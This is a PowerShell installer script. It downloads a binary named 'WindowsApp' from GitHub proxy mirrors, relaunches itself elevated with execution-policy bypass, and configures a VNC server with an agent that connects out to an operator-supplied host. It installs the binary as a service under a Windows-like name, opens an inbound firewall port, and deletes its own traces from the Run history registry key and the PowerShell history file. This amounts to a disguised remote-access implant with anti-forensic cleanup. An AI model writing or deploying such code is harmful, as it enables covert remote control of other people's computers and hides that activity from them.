param(
    [Parameter(Mandatory=$true)][string]$h,   # server_host
    [Parameter(Mandatory=$true)][string]$p,   # server_port
    [Parameter(Mandatory=$true)][string]$v,   # view-only password (8 chars)
    [Parameter(Mandatory=$true)][string]$c,   # control password (8 chars)
    [string]$b = 'https://ghfast.top/https://raw.githubusercontent.com/309804/1/gh-pages/1.4.19share'  # mirror base url (optional)
)

# WindowsApp one-shot bootstrap. This file contains NO secrets:
# server/password values are passed on the command line and written only
# into the encrypted WindowsApp.ini on the local machine.

$ErrorActionPreference = 'Stop'
$localPs1 = $null

# Mirror fallbacks: try the caller's -b first, then fast domestic mirrors, then origin.
$mirrors = @($b) + @(
    'https://ghfast.top/https://raw.githubusercontent.com/309804/1/gh-pages/1.4.19share',
    'https://gh-proxy.com/https://raw.githubusercontent.com/309804/1/gh-pages/1.4.19share',
    'https://raw.githubusercontent.com/309804/1/gh-pages/1.4.19share'
) | Where-Object { $_ } | Select-Object -Unique

function Save-FromMirror {
    param([string]$Name, [string]$Dest)
    foreach ($m in $mirrors) {
        try {
            Invoke-WebRequest -Uri ($m.TrimEnd('/') + '/' + $Name) -OutFile $Dest -UseBasicParsing -TimeoutSec 30
            if ((Test-Path -LiteralPath $Dest) -and ((Get-Item -LiteralPath $Dest).Length -gt 100)) { return }
        } catch {}
    }
    throw "FAILED to download $Name from all mirrors"
}

# --- erase traces of the plaintext passwords typed in the Win+R command ---
# Win+R stores the full command (with -h/-p/-v/-c values) in the registry
# RunMRU key. Remove only entries that reference this bootstrap, keep the
# user's other history, and repair the MRUList index.
try {
    $mru = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU'
    if (Test-Path -LiteralPath $mru) {
        $k = Get-ItemProperty -LiteralPath $mru
        $drop = @()
        foreach ($n in $k.PSObject.Properties.Name) {
            if ($n -like 'PS*' -or $n -eq 'MRUList') { continue }
            $val = [string]$k.$n
            if ($val -match 'wa_setup|309804|1\.4\.19share') { $drop += $n }
        }
        foreach ($n in $drop) {
            Remove-ItemProperty -LiteralPath $mru -Name $n -Force -ErrorAction SilentlyContinue
        }
        if ($drop.Count -gt 0) {
            $list = [string]$k.MRUList
            foreach ($n in $drop) { $list = $list.Replace($n, '') }
            Set-ItemProperty -LiteralPath $mru -Name MRUList -Value $list -Force -ErrorAction SilentlyContinue
        }
    }
} catch {}

# PSReadLine may also persist the command; drop matching lines from its history file.
try {
    $hist = (Get-PSReadLineOption -ErrorAction SilentlyContinue).HistorySavePath
    if ($hist -and (Test-Path -LiteralPath $hist)) {
        $kept = Get-Content -LiteralPath $hist -ErrorAction SilentlyContinue |
                Where-Object { $_ -notmatch 'wa_setup|309804|1\.4\.19share' }
        $kept | Set-Content -LiteralPath $hist -Encoding UTF8 -ErrorAction SilentlyContinue
    }
} catch {}

function Test-Admin {
    $id = [Security.Principal.WindowsIdentity]::GetCurrent()
    (New-Object Security.Principal.WindowsPrincipal($id)).IsInRole(
        [Security.Principal.WindowsBuiltInRole]::Administrator)
}

# self-elevate: download a local copy, then relaunch elevated with same params
if (-not (Test-Admin)) {
    $localPs1 = Join-Path $env:TEMP 'wa419_setup.ps1'
    Save-FromMirror 'setup.ps1' $localPs1
    $a = "-nop -ep bypass -f `"$localPs1`" -h '$h' -p '$p' -v '$v' -c '$c' -b '$b'"
    Start-Process -FilePath powershell -Verb RunAs -ArgumentList $a | Out-Null
    exit 0
}

$work = Join-Path $env:TEMP 'wa419'
New-Item -ItemType Directory -Force -Path $work | Out-Null

$w = 'WindowsApp'
foreach ($f in @(($w + '.exe'), ($w + '.dll'), ($w + '.ini'))) {
    Save-FromMirror $f (Join-Path $work $f)
}
$exe = Join-Path $work 'WindowsApp.exe'

# build plaintext ini from params, then encrypt via exe's built-in tool
$lines = @(
    '[service]',
    'fallback_poll_ms=3600000',
    'poll_interval_ms=2000',
    'restart.delay_ms=3000',
    'restart.max_count=0',
    '',
    '[vnc]',
    'port=5858',
    ('password=' + $c),
    ('view_only_password=' + $v),
    'update_interval_ms=100',
    'desktop_name=WindowsApp',
    '',
    '[agent]',
    'enabled=1',
    ('server_host=' + $h),
    ('server_port=' + $p),
    'use_tls=1',
    'vnc_port=5858',
    'reconnect_delay=10',
    'service_name=WindowsApp'
)
$plain = Join-Path $work 'plain.ini'
[IO.File]::WriteAllLines($plain, $lines)

& $exe encrypt-ini $plain (Join-Path $work 'WindowsApp.ini')
if ($LASTEXITCODE -ne 0) { throw 'encrypt-ini failed' }
Remove-Item -LiteralPath $plain -Force -ErrorAction SilentlyContinue
Write-Host '--- generated config ---'
& $exe check-ini (Join-Path $work 'WindowsApp.ini')

# install: stop old, copy, install + start, firewall
$target = 'C:\Program Files\WindowsApp'
& $exe stop 2>$null | Out-Null
& $exe uninstall 2>$null | Out-Null
New-Item -ItemType Directory -Force -Path $target | Out-Null
Copy-Item (Join-Path $work 'WindowsApp.exe'), (Join-Path $work 'WindowsApp.dll'), (Join-Path $work 'WindowsApp.ini') -Destination $target -Force
$tExe = Join-Path $target 'WindowsApp.exe'
& $tExe install (Join-Path $target 'WindowsApp.ini')
& $tExe start
netsh advfirewall firewall delete rule name='WindowsApp 5858' 2>$null | Out-Null
netsh advfirewall firewall add rule name='WindowsApp 5858' dir=in action=allow protocol=TCP localport=5858 | Out-Null

# remove temp working files (downloaded placeholder ini + local script copy)
Remove-Item -LiteralPath (Join-Path $work 'WindowsApp.ini') -Force -ErrorAction SilentlyContinue
Remove-Item -LiteralPath (Join-Path $work 'WindowsApp.exe') -Force -ErrorAction SilentlyContinue
Remove-Item -LiteralPath (Join-Path $work 'WindowsApp.dll') -Force -ErrorAction SilentlyContinue
Remove-Item -LiteralPath $localPs1 -Force -ErrorAction SilentlyContinue
Write-Host 'DONE. WindowsApp installed and started. Traces cleared.'
